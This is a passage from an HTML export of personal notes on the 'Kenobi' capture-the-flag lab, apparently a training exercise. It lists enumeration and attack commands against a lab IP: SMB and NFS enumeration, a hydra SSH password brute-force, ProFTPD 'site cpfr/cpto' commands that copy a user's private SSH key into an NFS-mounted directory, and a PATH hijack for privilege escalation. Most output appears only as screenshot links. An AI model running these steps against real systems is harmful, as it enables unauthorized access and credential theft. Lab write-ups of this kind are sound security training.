style="white-space:pre-wrap;word-break:break-all">smbclient -L 10.10.95.137 -N</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-80e7-a3ed-e755286e90fa" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">smbclient\\\\10.10.95.137\\Anonymous</code></pre></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-801f-85d8-d7f3532bb1eb" class="image"><a href="22%20Kenobi/image%201.png"><img style="width:709.96875px" src="22%20Kenobi/image%201.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80fe-993d-e151b137bd84" class="image"><a href="22%20Kenobi/image%202.png"><img style="width:709.984375px" src="22%20Kenobi/image%202.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8073-b8a6-c8a16a002d63" class="image"><a href="22%20Kenobi/image%203.png"><img style="width:554.9874877929688px" src="22%20Kenobi/image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-80d7-bf2d-fae8a0ab9e82" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">enum4linux -a 10.10.95.137</code></pre></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8011-af53-df74ce4b1eb2" class="image"><a href="22%20Kenobi/image%204.png"><img style="width:709.953125px" src="22%20Kenobi/image%204.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80ce-a22f-cc0f7821577c" class="image"><a href="22%20Kenobi/image%205.png"><img style="width:709.875px" src="22%20Kenobi/image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8045-9390-d835b99b4c51" class="">hydra: -L for mention the user file and -l is for direct use the username.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-8053-a710-c135bb3275e4" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">hydra -l kenobi -P /usr/share/wordlists/rockyou.txt 10.10.95.137 ssh</code></pre></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8094-959f-e69d5bf86221" class="">I don’t find any information hear.</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-801b-ae00-cad1b90eadee" class="toggle"><li><details open=""><summary>nfs:</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-80ec-84e4-c15968fd8673" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">showmount -e 10.10.204.93</code></pre></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80fe-a947-e506163ae178" class="image"><a href="22%20Kenobi/image%206.png"><img style="width:498px" src="22%20Kenobi/image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-8067-8298-fd6cc8481c5e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.95.137</code></pre></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-803a-80cd-fa5a959b8682" class="image"><a href="22%20Kenobi/image%207.png"><img style="width:554.9750366210938px" src="22%20Kenobi/image%207.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80aa-9ba9-c93b853a58b9" class="">hear -t is type.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-8067-b90f-f8d2946ce342" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">sudo mount -t nfs 10.10.95.137:/var /mnt/var</code></pre></div><div style="display:contents" dir="auto"><p id="194398f2-9c4e-800b-bb4a-f6bb68aaaed7" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-809f-a299-ce2480772dfd" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-8000-a75f-fb043510fbbd" class="toggle"><li><details open=""><summary>ftp:</summary><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8057-a964-e6322d40d0fc" class="image"><a href="22%20Kenobi/image%208.png"><img style="width:709.984375px" src="22%20Kenobi/image%208.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8023-b7fa-d8e438b324d6" class="image"><a href="22%20Kenobi/image%209.png"><img style="width:709.984375px" src="22%20Kenobi/image%209.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80da-b828-ff06b24ae63e" class="image"><a href="22%20Kenobi/image%2010.png"><img style="width:709.984375px" src="22%20Kenobi/image%2010.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8052-9742-ed1ac09c6861" class="image"><a href="22%20Kenobi/image%2011.png"><img style="width:709.984375px" src="22%20Kenobi/image%2011.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-807e-bd1b-ef6739bbd4e6" class="image"><a href="22%20Kenobi/image%2012.png"><img style="width:606px" src="22%20Kenobi/image%2012.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-80f0-87c2-dc66f9fa2c05" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">site cpfr /home/kenobi/.ssh/id_rsa</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-801b-b9d1-d24869555607" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">site cpto /var/tmp/id_rsa</code></pre></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8049-8846-f3223cd594fd" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-8018-955d-e97ec827a55b" class="toggle"><li><details open=""><summary>ssh:</summary><div style="display:contents" dir="auto"><p id="193398f2-9c4e-801c-aa7e-c7fe00e3daa4" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-805e-a7ed-e3fe99019c20" class="image"><a href="22%20Kenobi/image%2013.png"><img style="width:681.984375px" src="22%20Kenobi/image%2013.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8013-a725-ff744b702bbf" class="image"><a href="22%20Kenobi/image%2014.png"><img style="width:681.984375px" src="22%20Kenobi/image%2014.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8054-a1ef-eecd644b73fe" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-8058-bce4-d6a78ea5a0fe" class="image"><a href="22%20Kenobi/image%2015.png"><img style="width:681.96875px" src="22%20Kenobi/image%2015.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80a7-99ae-ce5556f0b115" class="image"><a href="22%20Kenobi/image%2016.png"><img style="width:419px" src="22%20Kenobi/image%2016.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-80e5-906a-f4b8b9fd351a" class="image"><a href="22%20Kenobi/image%2017.png"><img style="width:681.953125px" src="22%20Kenobi/image%2017.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-808f-847a-d6f910f51e10" class="image"><a href="22%20Kenobi/image%2018.png"><img style="width:681.984375px" src="22%20Kenobi/image%2018.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-8052-98e9-cf54565826bb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">export PATH=/tmp:$PATH</code></pre></div><div style="display:contents" dir="ltr"><figure id="193398f2-9c4e-808c-a0b6-c71050da15e3" class="image"><a href="22%20Kenobi/image%2019.png"><img style="width:576px" src="22%20Kenobi/image%2019.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80ae-90a9-def26564c63b" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80c4-8fc5-d1e57f8648ca" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-805e-86b9-e00f02642986" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8008-ba01-cfce342cd0e3" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-809e-8d42-e3183614791f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8027-b349-c3b8875fb6e9" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80e2-ae0c-c748e694169d" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80c0-b611-ed75f11b781f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80df-a139-f0548b2c85ee" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80d6-8209-f08b24e93155" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80b5-a6b1-d7bc81b36b7a" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8011-bcc1-d54b05247487" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8018-b05b-f3562134ea70" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8003-9f76-f1a7edec5f30" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80a8-bfd0-f5d36698960f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80f0-8b3f-e0efe58a883a" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8036-bdc3-e23fbb98d790" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80d8-870a-f39f8e5c0210" class="">
+</p></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-807c-8eff-e17411611b7a" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
